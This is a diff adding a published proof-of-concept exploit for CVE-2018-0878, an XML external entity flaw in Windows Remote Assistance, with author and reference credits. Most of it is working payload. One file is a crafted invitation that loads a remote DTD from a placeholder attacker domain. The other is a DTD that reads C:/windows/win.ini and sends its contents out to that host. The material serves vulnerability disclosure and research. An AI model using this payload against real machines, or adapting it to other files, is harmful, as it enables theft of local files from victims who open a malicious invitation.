@@ -1,0 +1,21 @@
+# Exploit Title: Microsoft Windows Remote Assistance XXE
+# Date: 27/03/2018
+# Exploit Author: Nabeel Ahmed
+# Tested on: Windows 7 (x64), Windows 10 (x64)
+# CVE : CVE-2018-0878
+# Category: Remote Exploits
+
+Invitation.msrcincident
+------------------------
+<?xml version="1.0" encoding="UTF-8" ?>  
+<!DOCTYPE zsl [  
+<!ENTITY % remote SYSTEM "http://<yourdomain.com>/xxe.xml">  
+%remote;%root;%oob;]>
+
+xxe.xml
+------------------------
+<!ENTITY % payload SYSTEM "file:///C:/windows/win.ini">  
+<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://<yourdomain.com>/?%payload;'> ">
+
+Reference: https://krbtgt.pw/windows-remote-assistance-xxe-vulnerability/
+Reference: Vulnerability discovered by Nabeel Ahmed (@NabeelAhmedBE) of Dimension Data (https://www.dimensiondata.com)
